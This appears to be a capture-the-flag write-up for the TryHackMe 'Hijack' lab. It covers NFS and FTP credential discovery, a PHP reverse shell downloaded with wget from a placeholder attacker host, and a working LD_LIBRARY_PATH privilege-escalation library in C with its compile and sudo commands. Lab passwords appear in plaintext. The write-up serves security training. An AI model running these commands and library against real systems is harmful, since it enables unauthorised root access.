# THM-Hijack

### Nmap result

### Mounting NFS

We will use `nfsshell` to mount the shared folder.

We see that there is a file called `for_employees.txt`, we will issue a `GET` command.

Inside the .txt file we see a ftp credential.

`ftpuser:W3stV1rg1n14M0un741nM4m4`

We then login to ftp using the credential.

```
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 .
drwxr-xr-x    2 1002     1002         4096 Aug 08 19:28 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08 19:28 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08 19:28 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08 19:28 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08 19:28 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08 19:28 .profile
```

We will then use the `GET` command to download the files.

We then get a passwords list.

`admin:uDh3jCQsdcuLhjVkAy5x`

We will then exploit the text box to inject code or RCE.

We will upload a .php reverse shell.

`wget ATTACKER_IP:PORT/rev.php`

and then change the URL to `\rev.php`

We then use `linpeas.sh` and we see a password.

When doing `sudo -l` we can see that rick can run application as sudo.

```
rick@Hijack:/tmp$ sudo -l
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

By exploiting the LD_LIBRARY_PATH (https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

We then create a C file and name it `anyname.c` and save it to `/tmp`

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

and run the `GCC` command

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/anyname.c`

then we will run the sudo command

`sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2`

We then can get a root.



`rick:"N3v3rG0nn4G1v3Y0uUp`




